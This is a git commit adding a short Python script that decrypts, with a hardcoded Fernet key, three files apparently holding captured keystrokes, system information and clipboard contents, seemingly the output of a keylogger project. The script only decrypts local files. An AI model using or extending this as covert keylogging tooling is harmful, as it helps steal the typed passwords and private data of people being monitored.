4a172cd2799b0b6f1ff09c3af425199d75ecb2b6
Issac-art75 <74670759+Issac-art75@users.noreply.github.com>
2024-10-11 09:16:23 +0530

    Add files via upload

---
+++ decryptfile.py
@@ -0,0 +1,24 @@
+from cryptography.fernet import Fernet
+
+key ="3Qg7tgyEwaaCBXtE2DBVf3y2zH9BuRuBiWGloJTliMc="
+
+keys_information_e = "e_key_log.txt"
+system_information_e = "e_sys_info.txt"
+clipboard_information_e = "e_clipboard.txt"
+
+encrypted_files = [system_information_e,clipboard_information_e,keys_information_e]
+count = 0
+
+for decrypted_files in encrypted_files:
+
+    with open(encrypted_files[count], 'rb') as f:
+        data = f.read()
+
+    fernet = Fernet(key)
+    decrypted = fernet.decrypt(data)
+
+    with open(encrypted_files[count], 'wb') as f:
+        f.write(decrypted)
+
+    count += 1
+
